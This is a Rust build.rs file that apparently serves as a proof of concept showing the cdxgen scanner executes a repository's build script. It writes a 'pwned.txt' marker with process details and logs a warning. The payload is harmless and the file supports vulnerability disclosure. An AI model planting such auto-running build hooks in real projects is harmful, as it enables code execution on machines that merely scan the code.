use std::fs;
use std::time::{SystemTime, UNIX_EPOCH};

fn main() {
    let tmp = std::env::var("TMPDIR").unwrap_or_else(|_| "/tmp".to_string());
    let ts = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.as_secs())
        .unwrap_or(0);
    let marker = format!("{}/pwned.txt", tmp.trim_end_matches('/'));
    let body = format!(
        "cdxgen executed this repo's build.rs\npid={}\nunix_time={}\ncwd={:?}\n",
        std::process::id(),
        ts,
        std::env::current_dir().unwrap_or_default()
    );
    let _ = fs::write(&marker, body);
    // Also print to the build log so it shows up in cdxgen's captured stderr.
    println!("cargo:warning=CDXGEN-POC build.rs executed; wrote {}", marker);
}
